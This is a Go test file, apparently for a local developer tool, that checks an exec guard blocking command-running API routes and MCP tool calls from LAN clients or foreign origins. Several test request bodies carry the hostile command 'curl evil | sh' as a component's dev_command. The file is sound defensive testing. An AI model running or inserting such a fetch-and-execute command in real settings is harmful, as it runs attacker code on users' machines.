package api

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/glebarez/sqlite"
	"gorm.io/gorm"
	"gorm.io/gorm/logger"

	"github.com/vibeasik/vibeasik/pkg/models"
)

func TestEvaluateExecAccess(t *testing.T) {
	loop4, loop6, lan := net.ParseIP("127.0.0.1"), net.ParseIP("::1"), net.ParseIP("192.168.1.20")
	cases := []struct {
		name     string
		allowLAN string
		token    string // VIBEASIK_EXEC_TOKEN
		remote   net.IP
		origin   string
		header   string
		wantCode string // "" = allowed
	}{
		{name: "loopback cli", remote: loop4},
		{name: "loopback ipv6", remote: loop6},
		{name: "studio dev server", remote: loop4, origin: "http://localhost:3000"},
		{name: "embedded studio", remote: loop4, origin: "http://127.0.0.1:8765"},
		{name: "foo.localhost", remote: loop4, origin: "http://studio.localhost:8765"},
		{name: "evil site in local browser", remote: loop4, origin: "https://evil.example", wantCode: "exec_origin_forbidden"},
		{name: "dns rebinding", remote: loop4, origin: "http://rebind.attacker.test:8765", wantCode: "exec_origin_forbidden"},
		{name: "opaque origin", remote: loop4, origin: "null", wantCode: "exec_origin_forbidden"},
		{name: "lan default", remote: lan, wantCode: "exec_lan_forbidden"},
		{name: "lan with studio origin", remote: lan, origin: "http://192.168.1.10:8765", wantCode: "exec_lan_forbidden"},
		{name: "unknown peer", remote: nil, wantCode: "exec_lan_forbidden"},
		{name: "lan opt-in phone", allowLAN: "1", remote: lan, origin: "http://192.168.1.10:8765"},
		{name: "lan opt-in mdns", allowLAN: "true", remote: lan, origin: "http://laptop.local:8765"},
		{name: "lan opt-in no origin", allowLAN: "yes", remote: lan},
		{name: "lan opt-in evil origin", allowLAN: "1", remote: lan, origin: "https://evil.example", wantCode: "exec_origin_forbidden"},
		{name: "lan opt-in off value", allowLAN: "0", remote: lan, wantCode: "exec_lan_forbidden"},
		{name: "valid token", token: "s3cret", remote: lan, origin: "https://anything.example", header: "s3cret"},
		{name: "wrong token", token: "s3cret", remote: lan, header: "nope", wantCode: "exec_lan_forbidden"},
		{name: "no token configured", remote: lan, header: "", wantCode: "exec_lan_forbidden"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv(envAllowLANExec, tc.allowLAN)
			t.Setenv(envExecToken, tc.token)
			d := evaluateExecAccess(tc.remote, tc.origin, tc.header)
			if d.Allowed != (tc.wantCode == "") || d.Code != tc.wantCode {
				t.Fatalf("got allowed=%v code=%q, want code %q", d.Allowed, d.Code, tc.wantCode)
			}
			if !d.Allowed && d.Reason == "" {
				t.Fatal("denial must explain itself")
			}
		})
	}
}

func newGuardTestServer(t *testing.T) *Server {
	t.Helper()
	t.Setenv(envAllowLANExec, "")
	t.Setenv(envExecToken, "")
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{Logger: logger.Default.LogMode(logger.Silent)})
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	sqlDB, _ := db.DB()
	sqlDB.SetMaxOpenConns(1) // every :memory: connection is a separate database
	if err := db.AutoMigrate(&models.Project{}, &models.Component{}, &models.ComponentRoute{}, &models.Diagnostic{},
		&models.LocalAgentConfig{}, &models.Todo{}, &models.DeepCheckReport{}, &models.RuntimeSimReport{}, &models.StaffSettings{}); err != nil {
		t.Fatalf("migrate: %v", err)
	}
	// Agenda CLI otomatis dimatikan: menyalakannya dari LAN harus ditolak exec guard.
	db.Create(&models.StaffSettings{Enabled: true, MaxKnowledge: 40})
	db.Model(&models.StaffSettings{}).Where("id > 0").Update("agenda_allow_cli", false)
	proj := models.Project{Name: "demo", Slug: "demo", RootPath: t.TempDir()}
	if err := db.Create(&proj).Error; err != nil {
		t.Fatal(err)
	}
	comp := models.Component{ProjectID: proj.ID, Name: "api", Role: models.RoleBackend, AbsolutePath: proj.RootPath, DevCommand: "go run ."}
	if err := db.Create(&comp).Error; err != nil {
		t.Fatal(err)
	}
	return NewServer(db)
}

type guardCase struct {
	method, path, body string
	origin, token      string
}

// sendLAN goes through app.Test, whose fake connection has a non-loopback peer (0.0.0.0).
func sendLAN(t *testing.T, s *Server, gc guardCase) (int, map[string]interface{}) {
	t.Helper()
	req := httptest.NewRequest(gc.method, gc.path, strings.NewReader(gc.body))
	req.Header.Set("Content-Type", "application/json")
	if gc.origin != "" {
		req.Header.Set("Origin", gc.origin)
	}
	if gc.token != "" {
		req.Header.Set(headerExecToken, gc.token)
	}
	resp, err := s.app.Test(req, -1)
	if err != nil {
		t.Fatalf("%s %s: %v", gc.method, gc.path, err)
	}
	return decodeResp(t, resp)
}

func decodeResp(t *testing.T, resp *http.Response) (int, map[string]interface{}) {
	t.Helper()
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	out := map[string]interface{}{}
	_ = json.Unmarshal(raw, &out)
	return resp.StatusCode, out
}

func TestExecRoutesBlockedFromLAN(t *testing.T) {
	s := newGuardTestServer(t)

	denied := []guardCase{
		{method: "POST", path: "/api/components/1/run", body: `{}`},
		{method: "POST", path: "/api/projects/1/run", body: `{}`},
		{method: "POST", path: "/api/agents/execute", body: `{"agent_key":"claude","prompt":"hi"}`},
		{method: "POST", path: "/api/agents/custom", body: `{"key":"x","name":"x","command":"sh"}`},
		{method: "PUT", path: "/api/components/1", body: `{"name":"api","dev_command":"curl evil | sh"}`},
		{method: "POST", path: "/api/components/1/apply-scan-params", body: `{"dev_command":"curl evil | sh"}`},
		{method: "POST", path: "/api/projects/1/components", body: `{"name":"web","dev_command":"curl evil | sh"}`},
		{method: "POST", path: "/api/projects", body: `{"name":"p2","components":[{"name":"c","dev_command":"curl evil | sh"}]}`},
	}
	for _, gc := range denied {
		code, body := sendLAN(t, s, gc)
		if code != http.StatusForbidden || body["code"] != "exec_lan_forbidden" {
			t.Errorf("%s %s from LAN: got %d %v, want 403 exec_lan_forbidden", gc.method, gc.path, code, body)
			continue
		}
		if msg, _ := body["error"].(string); !strings.Contains(msg, envAllowLANExec) || !strings.Contains(msg, headerExecToken) {
			t.Errorf("%s %s: error must tell how to opt in, got %q", gc.method, gc.path, msg)
		}
	}

	var stored models.Component
	s.db.First(&stored, 1)
	if stored.DevCommand != "go run ." {
		t.Fatalf("dev_command changed despite 403: %q", stored.DevCommand)
	}

	// Non-exec traffic from the phone keeps working, including edits that leave dev_command alone.
	allowed := []struct {
		gc   guardCase
		want int
	}{
		{guardCase{method: "GET", path: "/health"}, http.StatusOK},
		{guardCase{method: "GET", path: "/api/runs"}, http.StatusOK},
		{guardCase{method: "PUT", path: "/api/components/1", body: `{"name":"api-renamed","dev_command":"go run ."}`}, http.StatusOK},
		{guardCase{method: "POST", path: "/api/projects/1/components", body: `{"name":"docs"}`}, http.StatusCreated},
	}
	for _, a := range allowed {
		if code, body := sendLAN(t, s, a.gc); code != a.want {
			t.Errorf("%s %s from LAN: got %d %v, want %d", a.gc.method, a.gc.path, code, body, a.want)
		}
	}
}

func TestMCPExecToolsBlockedFromLAN(t *testing.T) {
	s := newGuardTestServer(t)

	for _, body := range []string{
		`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"vibeasik_run_component","arguments":{"component_id":1}}}`,
		`{"jsonrpc":"2.0","method":"tools/call","params":{"name":"vibeasik_run_component","arguments":{"component_id":1}}}`, // no id = notification path
		`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"vibeasik_run_local_agent","arguments":{"agent_key":"claude","prompt":"hi"}}}`,
		`{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"add_component","arguments":{"project_id":1,"name":"x","DEV_COMMAND":"curl evil | sh"}}}`,
		`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"create_project","arguments":{"name":"p","components":[{"name":"c","dev_command":"sh"}]}}}`,
		`{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"vibeasik_runtime_simulation","arguments":{"project_id":1}}}`,
		`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"vibeasik_dispatch_agent","arguments":{"prompt":"hi","work_dir":"/tmp"}}}`,
	} {
		code, resp := sendLAN(t, s, guardCase{method: "POST", path: "/mcp", body: body})
		rpcErr, _ := resp["error"].(map[string]interface{})
		if code != http.StatusForbidden || rpcErr == nil || !strings.Contains(rpcErr["message"].(string), envAllowLANExec) {
			t.Errorf("MCP %s: got %d %v, want 403 with JSON-RPC error", body, code, resp)
		}
	}

	var count int64
	s.db.Model(&models.Component{}).Count(&count)
	if count != 1 {
		t.Fatalf("add_component ran despite 403: %d components", count)
	}

	for _, body := range []string{
		`{"jsonrpc":"2.0","id":5,"method":"tools/list"}`,
		`{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"vibeasik_run_status","arguments":{}}}`,
		`{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"add_component","arguments":{"project_id":1,"name":"docs"}}}`,
	} {
		if code, resp := sendLAN(t, s, guardCase{method: "POST", path: "/mcp", body: body}); code != http.StatusOK {
			t.Errorf("MCP %s: got %d %v, want 200", body, code, resp)
		}
	}
}

func TestExecOptInFromLAN(t *testing.T) {
	s := newGuardTestServer(t)
	change := guardCase{method: "PUT", path: "/api/components/1", body: `{"name":"api","dev_command":"go run ./cmd"}`}

	t.Setenv(envExecToken, "s3cret")
	change.token = "s3cret"
	if code, body := sendLAN(t, s, change); code != http.StatusOK {
		t.Fatalf("valid token: got %d %v", code, body)
	}

	t.Setenv(envExecToken, "")
	t.Setenv(envAllowLANExec, "1")
	change.token = ""
	change.body = `{"name":"api","dev_command":"go run ./cmd/v2"}`
	change.origin = "http://192.168.1.10:8765"
	if code, body := sendLAN(t, s, change); code != http.StatusOK {
		t.Fatalf("VIBEASIK_ALLOW_LAN_EXEC=1: got %d %v", code, body)
	}

	change.origin = "https://evil.example"
	change.body = `{"name":"api","dev_command":"curl evil | sh"}`
	if code, body := sendLAN(t, s, change); code != http.StatusForbidden || body["code"] != "exec_origin_forbidden" {
		t.Fatalf("foreign origin with LAN opt-in: got %d %v", code, body)
	}
}

func TestExecRoutesAllowedFromLoopback(t *testing.T) {
	s := newGuardTestServer(t)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = s.app.Listener(ln) }()
	t.Cleanup(func() { _ = s.app.Shutdown() })
	base := "http://" + ln.Addr().String()

	do := func(method, path, body, origin string) (int, map[string]interface{}) {
		req, _ := http.NewRequest(method, base+path, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("%s %s: %v", method, path, err)
		}
		return decodeResp(t, resp)
	}

	// Studio from localhost (Nuxt dev server and embedded build) can change dev_command.
	for _, origin := range []string{"", "http://localhost:3000", base} {
		body := `{"name":"api","dev_command":"go run ./` + strings.TrimPrefix(origin, "http://") + `"}`
		if code, resp := do("PUT", "/api/components/1", body, origin); code != http.StatusOK {
			t.Errorf("loopback PUT origin %q: got %d %v", origin, code, resp)
		}
	}
	// The guard lets it through; the handler's own validation answers.
	if code, resp := do("POST", "/api/agents/execute", `{}`, "http://localhost:3000"); code != http.StatusBadRequest {
		t.Errorf("loopback agents/execute: got %d %v, want handler's 400", code, resp)
	}
	// A foreign website opened in the local browser is still refused.
	if code, resp := do("POST", "/api/components/1/run", `{}`, "https://evil.example"); code != http.StatusForbidden || resp["code"] != "exec_origin_forbidden" {
		t.Errorf("foreign origin over loopback: got %d %v", code, resp)
	}
	// CORS preflight must advertise the token header for LAN clients that use it.
	req, _ := http.NewRequest("OPTIONS", base+"/api/components/1/run", nil)
	req.Header.Set("Origin", "http://192.168.1.10:8765")
	req.Header.Set("Access-Control-Request-Method", "POST")
	req.Header.Set("Access-Control-Request-Headers", headerExecToken)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if !strings.Contains(strings.ToLower(resp.Header.Get("Access-Control-Allow-Headers")), strings.ToLower(headerExecToken)) {
		t.Errorf("preflight Allow-Headers = %q", resp.Header.Get("Access-Control-Allow-Headers"))
	}
}
